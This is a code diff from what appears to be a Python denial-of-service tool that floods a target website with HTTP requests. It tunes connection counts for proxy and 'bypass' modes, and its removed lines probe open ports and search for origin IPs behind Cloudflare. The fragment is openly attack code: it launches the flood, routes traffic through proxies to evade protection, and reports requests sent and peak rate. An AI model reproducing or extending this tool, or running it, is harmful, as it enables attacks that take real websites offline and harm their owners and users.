-            svc = {21:"FTP",22:"SSH",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",143:"IMAP",443:"HTTPS",465:"SMTPS",587:"SMTP",993:"IMAPS",995:"POP3S",1433:"MSSQL",1521:"Oracle",3306:"MySQL",3389:"RDP",5432:"Postgres",5800:"VNC",5900:"VNC",6379:"Redis",8080:"HTTP",8443:"HTTPS",8888:"HTTP",9090:"HTTP",27017:"MongoDB"}.get(p,"?")
-            open_ports.append(f"{p} ({svc})")
-    if open_ports:
-        print(f"[+] Open ports: {', '.join(open_ports)}")
+            if proxy_alive == 0:
+                safe_print("[!] No proxies — switching to direct mode")
+                proxy_mode = False
     else:
-        print("[+] No common ports open (still attacking target)")
+        proxy_pool = []
+        proxy_alive = 0
 
-    print("[*] Checking CDN/WAF...")
-    status, server, size = check_live(target, host)
-    print(f"[+] Status: {status} | Server: {server} | Size: {size}b")
+    safe_print("\n< / > Initializing...\n")
 
-    if "cloudflare" in str(server).lower():
-        print("[!] Cloudflare detected!")
-        print("[*] Searching origin IP...")
-        origins = find_origin(host)
-        if origins:
-            print("[+] Possible origin IPs:")
-            for o in origins[:8]:
-                print(f"    {o}")
-
-    if bypass_premium:
-        conns = 300
-    elif proxy_attack:
-        conns = min(150, len(proxy_pool))
+    if bypass_active:
+        conns = min(400, max(200, (proxy_alive if proxy_mode else 250) // 2 + 150))
+    elif proxy_mode:
+        conns = min(250, max(120, proxy_alive // 2 + 50))
     else:
-        conns = 150
+        conns = 200
 
-    print(f"\n[*] Launching attack ({conns} connections)...\n")
+    safe_print(f"\n[*] Launching ({conns} connections) ...\n")
     print_live()
 
     threading.Thread(target=stats_loop, daemon=True).start()
 
     running = True
+    stopped = False
 
     def run_http():
+        global running, stopped
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
-        loop.run_until_complete(http_attack(target, host, conns))
-        loop.close()
+        try:
+            loop.run_until_complete(http_attack(target, host, conns))
+        except Exception as e:
+            with lock:
+                last_code_label = f"FATAL: {e}"
+            running = False
+            stopped = True
+            safe_print(f"\n[!] Attack error: {e}")
+        finally:
+            loop.close()
 
     http_thread = threading.Thread(target=run_http, daemon=True)
     http_thread.start()
 
     try:
         while http_thread.is_alive():
-            time.sleep(0.5)
+            time.sleep(0.3)
     except KeyboardInterrupt:
-        print("\n[!] Stopping...")
+        pass
 
     running = False
+    stopped = True
     http_thread.join(timeout=3)
 
-    print(f"\n[+] Attack finished.")
-    print(f"    Requests: {total_sent}")
-    print(f"    OK:       {total_ok}")
-    print(f"    Errors:   {total_err}")
+    os.system("cls" if os.name == "nt" else "clear")
+    safe_print("\n[. . .] Stopping...")
+    time.sleep(0.3)
 
+    safe_print(f"\n [+] Attack finished")
+    safe_print(f"     Request sent    : {total_sent}")
+    safe_print(f"     Request success : {total_success}")
+    safe_print(f"     Request failed  : {total_failed}")
+    safe_print(f"     Proxy routed    : {total_proxy_used}")
+    safe_print(f"     Direct routed   : {total_direct_used}")
+    safe_print(f"     Peak RPS        : {req_rate:.1f}")
+    any_key()
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        pass
